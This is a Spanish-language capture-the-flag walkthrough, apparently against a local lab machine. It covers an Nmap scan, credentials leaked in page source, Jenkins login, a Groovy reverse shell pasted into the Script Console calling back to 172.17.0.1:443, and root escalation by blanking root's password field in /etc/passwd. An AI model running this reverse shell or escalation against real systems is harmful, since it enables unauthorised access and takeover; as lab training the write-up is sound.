Escaneo de puertos con Nmap:
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![](../../../Images/Pasted%20image%2020240905205257.png)

Observo lo que hay en el puerto 80:

![](../../../Images/Pasted%20image%2020240905205314.png)

Revisaré su código fuente para ver si encuentro alguna pista:

![](../../../Images/Pasted%20image%2020240909192829.png)

Y efectivamente, en la línea 34 y 40 obtengo al parecer unas credenciales "jenkins-admin:cassandra"

En el puerto 8080 tengo un panel de login hacia un Jenkins:

![](../../../Images/Pasted%20image%2020240905205448.png)

Probé credenciales por defecto pero ninguna me dio resultado, así que usaré las credenciales anteriormente encontradas del código fuente de la página base

![](../../../Images/Pasted%20image%2020240909193024.png)

![](../../../Images/Pasted%20image%2020240909193036.png)

Y ya accedí dentro de la página de Jenkins

Ahora voy a la ruta Manage Jenkins > Script Console y tengo una consola donde puedo escribir comandos, así que me lanzaré una RevShell en formato Groovy hacia mi kali escuchando con Netcat:
```
String host="172.17.0.1";int port=443;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![](../../../Images/Pasted%20image%2020240909193349.png)

![](../../../Images/Pasted%20image%2020240909193355.png)

Y recibí la conexión, ahora estoy dentro de la máquina

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020240909193506.png)

![](../../../Images/Pasted%20image%2020240909193528.png)

## ESCALADA DE PRIVILEGIOS

Leo los usuarios que contiene esta máquina

![](../../../Images/Pasted%20image%2020240909193739.png)

Y me doy cuenta de que existe el usuario "Jenkhack", así que buscaré si depronto existe una carpeta con este nombre:

![](../../../Images/Pasted%20image%2020240909193931.png)

Y existen 2, accederé a la de /var/www:

![](../../../Images/Pasted%20image%2020240909193957.png)

Y contiene una nota esta carpeta, la procedo a leer:

![](../../../Images/Pasted%20image%2020240909194013.png)

Es la contraseña de este usuario, pero está cifrada por ende procederé a descifrarla en la web Cyberchef:

![](../../../Images/Pasted%20image%2020240909194111.png)

Y obtengo la contraseña ya descifrada

Escalo a el usuario "jenkhack" con estas credenciales:

![](../../../Images/Pasted%20image%2020240909194146.png)

Y listo, ya cambié de usuario

Flag de user:

![](../../../Images/Pasted%20image%2020240909194221.png)

Ejecuto sudo -l para ver el binario que puedo usar

![](../../../Images/Pasted%20image%2020240909194238.png)

Y tengo un script

Lo leo:

![](../../../Images/Pasted%20image%2020240909194507.png)

Y me da una pista de que está usando un archivo llamado bash.sh ubicado en /opt, así que procedo a modificarlo permitiéndome editar el archivo /etc/passwd para borrar la "x" de el usuario root:

![](../../../Images/Pasted%20image%2020240909194651.png)

![](../../../Images/Pasted%20image%2020240909194814.png)

Y ahora ejecuto el script anterior:

![](../../../Images/Pasted%20image%2020240909195111.png)

Y borro la "x" de root:

![](../../../Images/Pasted%20image%2020240909194915.png)

![](../../../Images/Pasted%20image%2020240909195012.png)

Y listo, ahora soy ROOT

Flag de root:

![](../../../Images/Pasted%20image%2020240909195131.png)
